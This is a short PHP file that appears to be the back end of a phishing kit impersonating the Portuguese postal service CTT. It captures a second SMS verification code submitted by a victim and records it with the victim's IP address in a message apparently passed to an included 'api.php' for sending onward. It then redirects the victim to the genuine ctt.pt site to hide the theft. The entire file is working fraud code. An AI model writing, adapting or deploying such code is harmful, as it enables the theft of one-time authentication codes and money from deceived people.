<?php

session_start();


$cod2 = $_SESSION['cod2'] = $_POST['cod2'];



$hexor = '
CTT Post ~~
2SMSCode : '.$_SESSION["cod2"].' 
IP : '.$_SERVER['REMOTE_ADDR'].' 
';


include("api.php"); 



header('Location: https://www.ctt.pt/');


?>


